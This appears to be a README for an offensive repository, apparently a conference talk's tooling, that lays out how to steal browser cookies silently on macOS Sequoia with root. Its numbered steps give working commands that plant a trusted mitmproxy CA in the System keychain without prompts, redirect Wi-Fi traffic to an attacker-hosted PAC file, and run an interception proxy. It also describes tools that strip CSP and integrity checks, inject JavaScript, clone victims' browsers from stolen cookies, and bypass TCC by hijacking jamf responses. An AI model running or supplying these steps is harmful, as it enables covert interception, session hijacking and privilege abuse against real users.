# Blender
This repository contains the technique presented at SOCON2025 for stealing cookies silently from MacOS Sequoia with only root privileges

## Description

The technique is composed of adding a certificate (mitmproxy custom CA) to the System keychain without any trust, which doesn't alert the user with any prompts. Next, we update com.apple.trust-settings.user authorizationDb with allow.
We create another Keychain and add the same certificate with full trust. When we go back to check the certificate in the System Keychain it should be fully trusted.

## Steps
1. sudo security authorizationdb write com.apple.trust-settings.user allow
2. sudo security add-certificates -k /Library/Keychains/System.keychain ca.crt
3. security add-trusted-cert -p ssl -p smime -p eap -p IPSec -p codeSign -p timestamping -k custom.keychain -p basic ca.crt
4. sudo security list-keychains -s custom.keychain ~/Library/Keychains/login.keychain
5. sudo networksetup -setautoproxyurl Wi-Fi https://yourdomain/proxy.pac
6. sudo networksetup -setautoproxystate Wi-Fi on 
7. mitmproxy --listen-host 0.0.0.0 --listen-port 8080 --set block_global=false

## CookieFeeder

This is another tool to help you disable all the protections from the intercepted traffic (CSP, Integrity, etc) and inject abitrary Javascript. You can use it in combination with [https://github.com/](https://github.com/MythicAgents/bowser). It also a chrome extension that allows you to clone the target's browser by simply embedding the captured cookies.

## TCC Bypass

tcc.py is an MITMProxy script that can be used to bypass TCC. By hijacking the response of the "sudo jamf recon" command. It is possible to control what is executed by the jamf binary. The jamf binary is usually deployed with a PPPC rule to grant FDA: anything executed by the binary inherits its privileges.
